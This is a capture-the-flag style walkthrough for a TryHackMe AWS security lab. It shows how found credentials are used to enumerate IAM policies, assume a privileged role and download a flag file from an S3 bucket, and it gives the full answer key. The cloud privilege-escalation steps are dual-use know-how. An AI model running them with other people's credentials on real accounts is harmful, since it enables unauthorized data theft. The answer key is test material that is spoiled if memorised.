# 🎄 TryHackMe Advent of Cyber 2025 - Day 23: AWS Security - S3cret Santa

![TryHackMe](https://img.shields.io/badge/TryHackMe-AoC%202025-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Duration](https://img.shields.io/badge/Duration-30%20Minutes-blue?style=for-the-badge)
![Topic](https://img.shields.io/badge/Topic-AWS%20Security-orange?style=for-the-badge)

## 📋 Overview

**Room**: AWS Security - S3cret Santa  
**Topic**: AWS IAM Enumeration & S3 Access  
**Skills**: AWS CLI, IAM, Role Assumption, S3  

Learn to enumerate AWS permissions, assume roles for privilege escalation, and access S3 buckets to exfiltrate data.

---

## 📖 The Story

TBFC's infiltrator discovered Sir Carrotbane's **AWS credentials** left on his desktop. Use these to enumerate permissions, assume privileged roles, and regain access to TBFC's cloud network by exfiltrating data from S3.

---

## 🎓 Learning Objectives

- ✅ AWS account basics and authentication
- ✅ IAM components (Users, Roles, Groups, Policies)
- ✅ Enumerating user permissions
- ✅ Assuming AWS roles for privilege escalation
- ✅ Using AWS CLI for enumeration
- ✅ Accessing S3 buckets and downloading files

---

## 🔑 IAM Components

### Users
Single identity with unique credentials (Access Key + Secret Key)

### Groups
Collections of users with shared permissions

### Roles
Temporary identities that can be **assumed** for elevated privileges

### Policies
JSON documents defining: **Who** → **What actions** → **Which resources**

---

## 🚀 Complete Walkthrough

### Phase 1: Verify Identity

```bash
aws sts get-caller-identity
```

**Output**: Account ID `123456789012`, User `sir.carrotbane`

---

### Phase 2: Enumerate Permissions

#### List Inline Policies
```bash
aws iam list-user-policies --user-name sir.carrotbane
```
**Found**: `SirCarrotbanePolicy`

#### Get Policy Details
```bash
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
```

**Key Permission**: `sts:AssumeRole` ← Privilege escalation path!

---

### Phase 3: Assume Role

#### List Roles
```bash
aws iam list-roles
```
**Found**: `bucketmaster` (can be assumed by sir.carrotbane)

#### Get Role Permissions
```bash
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**Permissions**:
- `s3:ListAllMyBuckets`
- `s3:ListBucket` (easter-secrets-123145, bunny-website-645341)
- `s3:GetObject` (easter-secrets-123145/*)

#### Assume Role
```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```

#### Set Temp Credentials
```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
```

---

### Phase 4: Access S3

#### List Buckets
```bash
aws s3api list-buckets
```

#### List Objects
```bash
aws s3api list-objects --bucket easter-secrets-123145
```
**Found**: `cloud_password.txt`

#### Download File
```bash
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```

#### Read Flag
```bash
cat cloud_password.txt
```
**Flag**: `THM{more_like_sir_cloudbane}`

---

## 🎯 Flags & Answers

| Question | Answer |
|----------|--------|
| Account number? | `123456789012` |
| IAM component for permissions? | `policy` |
| Policy assigned to sir.carrotbane? | `SirCarrotbanePolicy` |
| Other action besides GetObject and ListBucket? | `ListAllMyBuckets` |
| Contents of cloud_password.txt? | `THM{more_like_sir_cloudbane}` |

---

## 📚 Command Reference

### Identity
```bash
aws sts get-caller-identity
```

### IAM Enumeration
```bash
aws iam list-users
aws iam list-user-policies --user-name <user>
aws iam get-user-policy --policy-name <policy> --user-name <user>
aws iam list-roles
aws iam get-role-policy --role-name <role> --policy-name <policy>
```

### Role Assumption
```bash
aws sts assume-role --role-arn <arn> --role-session-name <name>
export AWS_ACCESS_KEY_ID="<key>"
export AWS_SECRET_ACCESS_KEY="<secret>"
export AWS_SESSION_TOKEN="<token>"
```

### S3 Operations
```bash
aws s3api list-buckets
aws s3api list-objects --bucket <bucket>
aws s3api get-object --bucket <bucket> --key <file> <local>
```

---

## 🔐 Security Concepts

### Privilege Escalation Path
```
sir.carrotbane (limited permissions)
    ↓ sts:AssumeRole
bucketmaster role (S3 access)
    ↓ s3:GetObject
Sensitive data exfiltrated
```

### Misconfigurations

| Issue | Impact |
|-------|--------|
| Unrestricted AssumeRole | Any role can be assumed |
| Overly permissive S3 policies | Unauthorized data access |
| Credentials left exposed | Initial compromise |

### Best Practices

- ✅ Restrict AssumeRole to specific roles
- ✅ Apply least privilege principle
- ✅ Enable CloudTrail logging
- ✅ Secure S3 buckets (block public access)
- ✅ Rotate credentials regularly
- ✅ Enable MFA for sensitive operations

---

## 💡 Key Takeaways

✅ AWS credentials enable programmatic access  
✅ IAM policies control resource permissions  
✅ Roles enable temporary privilege escalation  
✅ `sts:AssumeRole` is powerful—restrict it!  
✅ S3 buckets often contain sensitive data  
✅ Enumeration reveals escalation paths  
✅ AWS CLI is essential for cloud operations  

---

## 🔗 Related Rooms

- **AWS Basics** (TryHackMe)
- **Cloud Security Fundamentals**
- **IAM Deep Dive**
- **S3 Security Best Practices**

---

**🎄 Happy Cloud Hacking! ☁️**

*Apply least privilege, secure your buckets, and never leave credentials exposed!*
